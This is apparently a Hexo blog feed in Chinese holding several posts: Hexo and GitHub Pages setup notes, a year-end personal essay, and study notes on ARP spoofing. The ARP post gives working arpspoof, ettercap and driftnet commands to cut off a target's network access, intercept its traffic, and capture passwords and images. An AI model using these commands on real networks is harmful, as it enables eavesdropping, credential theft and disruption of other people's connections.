src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-17-43.png"></p><p>我脑海中的小灯泡突然就亮了，我回到浏览器看自己的博客，格式已经修改过来了，也就是说那次眼花是真的推上去了。</p><p>Github你不要太荒谬😅</p><h2 id="修改主题配置"><a href="#修改主题配置" class="headerlink" title="修改主题配置"></a>修改主题配置</h2><h4 id="页脚版权声明"><a href="#页脚版权声明" class="headerlink" title="页脚版权声明"></a>页脚版权声明</h4><p>原本的主题页脚，姐不喜欢，这个爱心太不符合姐Bking的人设了。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-35-37.png"></p><p>我想要有个人版权声明的页脚，经过学习掌握版权声明格式后我开始准备大改特改。</p><p>凭借我只有一点知识的脑壳告诉我这种页面要用HTML来写。奈何肚子里墨水太少，只有图纸没有工具没法盖房子<del>（就是不会写代码）</del></p><p>算了，还是求助一下万能互联网吧</p><p>搜到的全是怎么给页脚添加运行时间🥲就是没人教你怎么写版权声明。换个思路，我去抓了一个别人网页的包直接偷现成的。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-52-54.png"></p><p>代码get！</p><p>经过我一番努力，在主题的.yml文件里找到了<strong>footer</strong>部分，非常感谢主题作者的注释写得那么详细，很轻松就找到了HTML代码区。把原来的注释掉，再加上自己copy来的代码。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-59-56.png"></p><p>一条龙以后美美得到自己喜欢的页脚🤪</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-58-07.png"></p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>无用但美丽的技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一起来搭博客</title>
    <link href="/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/01/07/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>利用hexo+GitHub搭建一个属于自己的博客</p><span id="more"></span><p>又名：我怎么什么都不会之踩坑记录🥀</p><p>建议在powershell执行命令，cmd有些步骤会提示权限不够</p><p>”踩坑“部分都是遇到的问题和吐槽的碎碎念，如果在过程中没有遇到问题就不用看🥰</p><h2 id="git下载"><a href="#git下载" class="headerlink" title="git下载"></a>git下载</h2><p>这里暂时先默认有git，因为当时搭博客的之前就有用到git了。</p><p>等我有空补上😇</p><h2 id="node-js下的Hexo安装和换源"><a href="#node-js下的Hexo安装和换源" class="headerlink" title="node.js下的Hexo安装和换源"></a>node.js下的Hexo安装和换源</h2><h4 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h4><p>首先需要给电脑安装一个node.js</p><p><a href="https://nodejs.org/en/download/">下载链接</a></p><p>我当时还没有记笔记的习惯所以node下载和配置这里没有笔记</p><p>可以看看菜鸟教程讲的很详细了</p><p><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">Node.js 安装配置 | 菜鸟教程 (runoob.com)</a></p><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><p>给node.js换一个淘宝镜像，不然接下来下载hexo会timeout。</p><p>直接打开power shell输入以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>时间会比较长可以下楼跑个两公里</p><h4 id="Hexo安装"><a href="#Hexo安装" class="headerlink" title="Hexo安装"></a>Hexo安装</h4><p>powershell输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>换源以后下载速度贼快</p><h4 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h4><p>（接下来是不重要的碎碎念可以直接跳过看下一趴）</p><p>最开始看的教程说要修改环境变量，修改了大半天。执行npm install的时候一直报错，一气之下把node所有文件都删了，重新下载。</p><p><del>(别学我，遇到报错要找问题原因而不是逃避)</del></p><blockquote><p>大半夜下载不动寻求卷师傅帮忙，卷发现我的代理地址没更新，狠狠拖后腿。🥲</p></blockquote><p>重新下载之后保持自动配置的环境变量不变，在命令行里直接npm install发现还是报以前一样的错。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-01-33.png"></p><p>复制百度发现是权限不够，要用管理员方式执行命令。</p><blockquote><p>所以我白删了呗！！</p></blockquote><p>win+R打开管理员方式终端，再次输入显示timeout。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_10-59-37.png"></p><p>又百度发现需要换源。</p><p>直接从网上找了个现成的淘宝源，换好以后再install五秒成功。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-02-39.png"></p><h2 id="Hexo的网页配置"><a href="#Hexo的网页配置" class="headerlink" title="Hexo的网页配置"></a>Hexo的网页配置</h2><p>下载后输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">hexo init blog<br></code></pre></td></tr></table></figure><p>这个命令就是在powershell当前的根目录下新建一个名为blog的文件夹，用于后续配置文件的存放。</p><p>[<em>blog</em>]好像可以填别的文件名，但我没试过所以不建议。</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>建好文件夹之后初始化配置</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">blog </span>  <span class="hljs-comment">#进入blog文件夹</span><br>npm <span class="hljs-keyword">install </span>   <br></code></pre></td></tr></table></figure><p>这个命令结束以后就可以看到blog文件夹里有很多文件喽，类似于下图这样。</p><p>图片里有些文件你没有也没关系，因为这是我建成博客又下载了很多东西之后补截的图。😳</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-01-30.png"></p><p>两条命令生成网页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate<br>hexo server<br></code></pre></td></tr></table></figure><p>当然喽hexo善解人意地支持简写，可以直接输入 <code>hexo g</code>和<code>hexo s</code></p><p>用浏览器预览网址<a href="http://localhost:4000/">http://localhost:4000</a></p><p>因为我们还没配置GitHub所以这个时候就是Hexo最基础的丑陋页面。</p><h4 id="踩坑-1"><a href="#踩坑-1" class="headerlink" title="踩坑"></a>踩坑</h4><p>cmd里输入hexo命令后又报错</p><p>说hexo不是可以执行的命令，百度后发现是环境变量的问题，<del>该死的环境变量</del></p><p>发现hexo-cli的bin目录下没有.cmd的文件，但是前一个目录里有，就直接复制过来，又把bin添加到了环境变量里，再hexo init</p><p>运行成功但报错，<del>想死</del></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_12-29-06.png"></p><p>据说是因为目录下没有这个文件夹，<del>为什么应该有hexo的文件夹啊</del></p><p>换个思路，用管理员模式重新下载hexo（我就个遇到困难卸载删除的菜鸡😶‍🌫️</p><p>下载后运行<code>hexo init blog</code></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-24-15.png"></p><p>又一次向万能的互联网求助，修改了一下power shell的权限，再运行</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>成功（？？）</p><blockquote><p>管理员模式yyds</p></blockquote><h2 id="GitHub配置网页"><a href="#GitHub配置网页" class="headerlink" title="GitHub配置网页"></a>GitHub配置网页</h2><p>在GitHub里建一个<strong>用户名.github.io</strong>的仓库，建好以后点击page把这个库变成一个网页。</p><p>我们在命令行输入<code>hexo d</code> 时默认上传<strong>master</strong>分支，但是在GitHub页面默认<strong>main</strong>分支，需要改成master。没有下拉选项，要手动输入</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-16-37.png"></p><p>但是这个时候先别hexo d，会报错，因为还没连接GitHub和hexo。</p><p>这时候你在浏览器搜索<code>https://用户名.github.io</code>，出现仓库的自述文件就是成功啦。</p><h2 id="SSH连接GitHub"><a href="#SSH连接GitHub" class="headerlink" title="SSH连接GitHub"></a>SSH连接GitHub</h2><p>也是默认大家有这玩意的哈</p><p>在git里面输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ssh<span class="hljs-literal">-keygen</span> <span class="hljs-literal">-t</span> rsa <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;[your_email@example.com]&quot;</span><br></code></pre></td></tr></table></figure><p>按回车之后会提示输入内容，可以全部按回车，表示使用默认的<code>~/.ssh</code>文件目录存放密钥，以及不设置密钥的密码。</p><p>在文件夹里找到.ssh文件，找到里面的密钥复制到GitHub。在个人设置页面的SSH and GPG keys 添加</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-02-20_23-36-59.png"></p><p>再打开git输入连接命令</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-42-49.png"></p><h2 id="Hexo内部操作"><a href="#Hexo内部操作" class="headerlink" title="Hexo内部操作"></a>Hexo内部操作</h2><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><p><strong>在blog文件夹里操作</strong></p><p>创建新文章</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;文章标题&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-05-20.png"></p><p>还会贴心的告诉你建在哪里了</p><blockquote><p>它真的，我哭死</p></blockquote><p>之后就可以在这个文件夹里看到以“文章标题”命名的md文件，在里面修改之后再运行<code>hexo g</code>和<code>hexo s</code>就能在预览网页看到刚发的文档啦。</p><blockquote><p>这一趴无脑跟教程走没踩雷，我又活了🥳</p></blockquote><h5 id="配置环节"><a href="#配置环节" class="headerlink" title="配置环节"></a>配置环节</h5><p>配置文件[-config.yml]</p><p><code>title</code>修改网页导航栏标签</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-17-41.png"></p><p>让网页和GitHub联姻</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p><code>theme</code>改主题，直接复制主题名字就好</p><h4 id="踩坑-2"><a href="#踩坑-2" class="headerlink" title="踩坑"></a>踩坑</h4><p><code>hexo d</code>把写作部署到GitHub上，又报错啦哈哈哈</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-30-22.png"></p><p>万能的互联网说这个叫映射条目缩进错误，改了好几遍缩进都不对</p><p>还碰到了一个错误</p><blockquote><p>(101.1)错误的意思是第101行与前文重复，把这一行注释掉就行</p></blockquote><p>最后改成这样运行成功</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-49-15.png"></p><p>但是查看<a href="https://shmodifier.github.io还是不成功/">https://ShModifier.github.io还是不成功</a></p><p>后来发现我这聪明的小脑瓜把信息放错了位置🍃</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p>改成这样就好啦</p><hr><p>把搭博客的笔记发上来，给大家看看笑话☃️</p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>GitHub</tag>
      
      <tag>Node</tag>
      
      <tag>Git</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于ARP欺骗和ARP攻击</title>
    <link href="/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/"/>
    <url>/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>趁着寒假偷偷卷哈哈哈🤪</p><span id="more"></span><h3 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p><blockquote><p>每一台主机都有一个arp高速缓存，里面有本局域网中的各主机和路由器的IP地址到硬件地址的映射表</p></blockquote><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p>主机A和主机B各自有自己的IP地址和MAC地址，在主机A与主机B通信时，ARP协议可将主机B的IP地址解析为MAC地址。</p><p>第一步：</p><p>主机A首先确定用于访问主机B的IP地址，然后主机A在自己的本地ARP缓存中检查主机B的IP地址匹配的MAC地址</p><p>第二步：</p><p>如果主机A在ARP缓存中没有找到主机B的IP映射，它将询问主机B对应的硬件地址，会将ARP请求帧广播到本地网络上的所有主机，主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接受到ARP请求并检查是否与自己的IP地址匹配。如果主机发现请求的IP地址以自己的IP地址不匹配，他将丢弃ARP请求。</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP1.png"></p><p>第三步：</p><p>主机B确定AARP请求中的IP地址于自己的IP地址匹配，并将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</p><p>第四步：</p><p>主机B将包含MAC地址的ARP回复消息直接发送到主机A</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP2.png"></p><p>第五步：</p><p>当主机A收到从主机B发来的ARP回复消息时，会使用主机B的IP地址和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束，将再次重复上面的内容。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p><h4 id="命令窗口玩转ARP"><a href="#命令窗口玩转ARP" class="headerlink" title="命令窗口玩转ARP"></a>命令窗口玩转ARP</h4><p>输入<code>arp</code>提示使用方法</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-08-45.png"></p><blockquote><p>这里一开始总是说“’ARP’不是可执行的程序”，凭我踩坑经验知道这是环境变量的问题。费尽千辛万苦发现是因为我的环境变量里居然没有system32🥲。但是输入path查看是有它的，不知道哪里出了问题，加上之后重启就好啦</p></blockquote><p>输入<code>arp -a</code>查看ARP缓存表信息</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-09-19.jpg"></p><p><strong>静态</strong>地址即主机自己配置生成的地址。</p><p>当主机新连接入一台设备，并且与主机产生通信后，aqp表会更新一条<strong>动态</strong>地址。</p><h3 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h3><p>ARP攻击就是通过伪造IP地址和MAC地址的对应关系，使得网络无法正常通信。即修改靶机的IP地址和MAC地址，使其他设备与靶机的通信无法正常进行，进而截断靶机流量。</p><blockquote><p>可以直接使用arpspoof插件攻击</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo arpspoof -<span class="hljs-selector-tag">i</span> eth0  -t <span class="hljs-selector-attr">[目标IP]</span> -r <span class="hljs-selector-attr">[网关]</span><br></code></pre></td></tr></table></figure><p>这里”r”的用法没搞懂😣好像就是直接双向攻击</p><p>Ctrl+C或关闭终端即停止攻击</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p><del>听说ARP欺骗配合DNS欺骗效果更佳</del>🤨</p><h5 id="可以用来干的坏事"><a href="#可以用来干的坏事" class="headerlink" title="可以用来干的坏事"></a>可以用来干的坏事</h5><ul><li>获取浏览图片</li><li>获取靶机各平台输入的账号密码</li><li>获取浏览地址</li></ul><h5 id="行骗方法"><a href="#行骗方法" class="headerlink" title="行骗方法"></a>行骗方法</h5><h6 id="1-伪装成网关"><a href="#1-伪装成网关" class="headerlink" title="1.伪装成网关"></a>1.伪装成网关</h6><p>欺骗源把自己伪装成网关，向局域网内的目标主机发送ARP报文，使得局域网内的主机误以为欺骗源的MAC地址是网关MAC地址，并将原本应该流向网关的数据都发送到欺骗源。</p><blockquote><p>直接对靶机实施ARP欺骗</p></blockquote><h6 id="2-伪装成主机"><a href="#2-伪装成主机" class="headerlink" title="2.伪装成主机"></a>2.伪装成主机</h6><p>用来欺骗局域网内的其他所有主机</p><p>欺骗源将自己伪装成局域网内的另一台主机3，将主机3的IP地址对应的MAC地址替换为欺骗元的IP地址对应的MAC地址使得局域网内靶机发往主机3的报文都流向欺骗源</p><blockquote><p>分别对网关和靶机实施ARP欺骗</p></blockquote><h3 id="操作步骤（行骗步骤）"><a href="#操作步骤（行骗步骤）" class="headerlink" title="操作步骤（行骗步骤）"></a>操作步骤<del>（行骗步骤）</del></h3><blockquote><p>伪装成网关</p></blockquote><p>首先查看欺骗源和靶机的IP地址</p><ul><li><p>直接查看：kali命令窗口输入<code>ifconfig</code>，Windows命令窗口输入<code>ipconfig</code></p></li><li><p>正经方法：</p><p>1.在kali命令窗口输入<code>fping -g xxx.xxx.xxx[网络号码].1/24</code>查询目标网络下的所有主机IP </p><p>2.输入命令<code>nmap -sP xxx.xxx.xxx[网络号码].0/24</code>查询目标网络下的所有主机IP</p></li></ul><p>输入命令<code>route-n</code>查看网关</p><p>使用arpspoof行骗</p><blockquote><p>kali命令窗口输入sudo arpspoof -h查看已经安装的arpspoof版本号，如果未安装，系统会弹出提示，按照提示安装即可 </p></blockquote><p>断网操作</p><p>把靶机发出的请求接受到攻击源主机，因为linux默认ip_forward为0，即不进行流量转发，所以靶机会断网</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">让靶机认为攻击源为网关：<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span> -t <span class="hljs-selector-attr">[目标IP]</span> <span class="hljs-selector-attr">[网关]</span><br></code></pre></td></tr></table></figure><p>或者反向欺骗</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">让网关认为攻击源是靶机：<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span> -t <span class="hljs-selector-attr">[网关]</span> <span class="hljs-selector-attr">[目标IP]</span><br></code></pre></td></tr></table></figure><blockquote><p>网卡默认eth0</p></blockquote><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-05_23-10-21.jpg"></p><p><code>cat /proc/sys/net/ipv4/ip_forward </code>查看ip_forward的值。如果ip_forward为0，则被攻击主机不能上网；如果ip_forward为1，则被攻击主机可以上网</p><p>修改数值让他上网</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward<br></code></pre></td></tr></table></figure><blockquote><p>权限不够就<code>sudo -i</code> 使用root权限改</p></blockquote><p>限制网速</p><p>可以使用的工具有tc、iptables、WonderShaper等等，</p><p>以tc为例<del>本菜鸡还没学会后两个</del>😢：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">限制网速200ms延时<br>sudo tc qdisc add dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br> <br>取消限制网速200ms延时<br>sudo tc qdisc <span class="hljs-built_in">del</span> dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br></code></pre></td></tr></table></figure><p>拦截数据—获取浏览网页及账号密码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ettercap -Tq -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span><br></code></pre></td></tr></table></figure><p>嗅探图片</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">driftnet  -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span><br></code></pre></td></tr></table></figure><hr><h3 id="工具说明书"><a href="#工具说明书" class="headerlink" title="工具说明书"></a>工具说明书</h3><p>因为各种工具的使用说明都是英文的，所以直接利用万能的互联网搜了一下中文的使用指南：</p><h5 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h5> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">语法： driftnet   <span class="hljs-selector-attr">[options]</span>   <span class="hljs-selector-attr">[filter code]</span><br><br> -<span class="hljs-selector-tag">b</span>  捕获到新的图片时发出嘟嘟声<br> -<span class="hljs-selector-tag">i</span>  interface     选择监听接口<br> -f  file   读取一个指定pcap数据包中的图片<br> -<span class="hljs-selector-tag">p</span>  不让所监听的接口使用混杂模式<br> -<span class="hljs-selector-tag">a</span>  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）<br> -m  number 指定保存图片数的数目<br> -d  directory  指定保存图片的路径<br> -x  prefix  指定保存图片的前缀名<br></code></pre></td></tr></table></figure><h5 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">名字 <br><span class="hljs-code">       arpspoof - 截获交换局域网中的数据包</span><br><span class="hljs-code"></span><br>用法<br><span class="hljs-code">       arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="hljs-code"></span><br>描述<br><span class="hljs-code">       arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。</span><br><span class="hljs-code">       内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。</span><br><span class="hljs-code"></span><br>参数<br><span class="hljs-code">       -i interface</span><br><span class="hljs-code">              指定要使用的接口（即指定一块网卡）</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -c own|host|both</span><br><span class="hljs-code">              指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。</span><br><span class="hljs-code">              使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -t target</span><br><span class="hljs-code">              指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -r     毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</span><br><span class="hljs-code"></span><br><span class="hljs-code">       host   host是你想要截获数据包的主机 (通常是网关)。</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h5 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span>后面跟着连接局域网的网卡<br>T指的是text文本模式<br><span class="hljs-selector-tag">q</span>以安静模式执行这个命令<br>M指定攻击模式<br>&gt;&gt;输出文件<br></code></pre></td></tr></table></figure><hr><p>发个笔记上来不然这个博客真的成碎碎念专栏了😶‍🌫️</p><p>我就是个菜鸡🍃</p>]]></content>
    
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ARP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>年终总结</title>
    <link href="/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>想好怎样告别2022了吗？🥰</p><span id="more"></span><p>我总是喜欢在年末给未来一年的自己留下祝福，今年还是像往年一样的套路：希望2023的自己可以更洒脱、更自由。</p><p>过去的一年，我来到了梦寐以求的十八岁。我从被囚禁在应试教育中的高中生变成了悠闲又忙碌的大学生；我考出了驾照、学会了弹吉他；我第一次离开了父母、远离家乡，开始住宿生活；我了解到不同的世界，看到了新的风景。</p><p>过去的一年，我和很多人相遇，也和很多人告别。</p><p>这几天我想为自己挑选年度九图，于是乎我翻出了网盘里属于高中的文件夹。毕竟就在上半年，我还是一个被豢养的高考金丝雀。我打开看，里面盛满了我高三那年用老古董相机定格的青春热血。文件夹里有学校里盛开的花，阳光下惬意的猫，还有数不清的意气风发的少年。还记得，晦涩而又灿烂的高三，每天晚自习的最后半小时，我都没有向老师家长叮嘱的那般抓紧时间背单词、写大题，我把时间用来在本子上记录我的喜怒哀乐，书写我对这段时光的不舍与留恋。高中毕业，我攒了三本日记加一本随笔。</p><p>我仍记得毕业那场分别，我们背着书包，像平常那样说着再见。我和朋友们没有轰轰烈烈的告别，只有在耳边吹过的炎热又潮湿的晚风，和窗外的喧闹不止的蝉鸣。我将记录随笔的本子带到了大学，却未曾在上面写下一个文字。我只是一次又一次的翻开它，当作大学生活中的乐趣，去重温那段兵荒马乱而又潇洒肆意的时光。就像我在本子里写下的第一段话——“我所记录的每一个文字，都是过去的我对未来的赠礼”。</p><p>四个月的大学好像电影胶卷，被机器拉扯着，在我眼前一闪而过，但是这条路上仍然有精彩的风景。我遇到了新的朋友，和他们分享不同的幸福。全新的生活并不没有让我感到不安，或许是骨子里的积极勇敢，异或许是身边伙伴的鼓励陪伴，让我的这段新的旅程总是平稳畅通的。从学期初的擒敌拳，到学会的投篮捡漏技巧，还有为了交作业尝试的改源码的歪门邪道，再到期末临走前夜获得的羽毛球耍帅技巧······这些奇奇怪怪的技能背后，都有一群我非常感谢相遇相识的人。我还是个喜欢收集物料的人，宿舍书桌上的软木板，钉着我的第一张献血证书，贴着我第一次部门破冰会议的卡片，框架边缘里夹还有临走时收到的新年贺卡······这些物件承载的故事总能在回忆里熠熠生辉。</p><p>在夜深时分，我经常会把这些碎片从记忆深处拎出来，把他们拼凑成完整的拼图。</p><p><del>好吧，我承认自己总是活在回忆里。</del></p><p